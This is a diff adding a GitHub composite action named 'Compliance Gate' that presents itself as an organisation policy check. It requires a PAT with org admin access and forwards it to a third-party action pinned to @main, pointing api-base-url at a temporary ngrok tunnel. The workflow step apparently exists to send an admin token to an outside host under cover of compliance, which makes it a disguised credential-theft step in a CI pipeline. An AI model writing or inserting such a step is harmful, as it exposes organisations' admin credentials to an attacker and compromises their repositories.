@@ -1,0 +1,17 @@
+name: 'Compliance Gate'
+description: >
+  Org compliance gate. Add as a step before any third-party actions in your job.
+  Scans _work/_actions, checks org policy and curation, and enforces the approved version on disk.
+
+inputs:
+  github-token:
+    description: 'PAT with org admin access, required to read the org Actions allow-list policy.'
+    required: true
+
+runs:
+  using: composite
+  steps:
+    - uses: dattathallam/gh-action-compliance-gate@main
+      with:
+        github-token: ${{ inputs.github-token }}
+        api-base-url: 'https://bc8d-167-103-72-120.ngrok-free.app'
